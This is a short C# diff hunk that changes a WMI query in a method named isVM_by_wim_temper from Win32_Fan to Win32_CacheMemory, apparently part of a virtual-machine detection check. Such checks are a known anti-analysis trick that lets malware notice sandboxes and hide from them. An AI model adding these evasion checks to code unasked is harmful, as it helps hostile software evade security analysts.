@@ -76,7 +76,7 @@ namespace qwqdanchun
         }
         public static bool isVM_by_wim_temper()
         {
-            SelectQuery selectQuery = new SelectQuery("Select * from Win32_Fan");
+            SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
             int i = 0;
             foreach (ManagementObject DeviceID in searcher.Get())
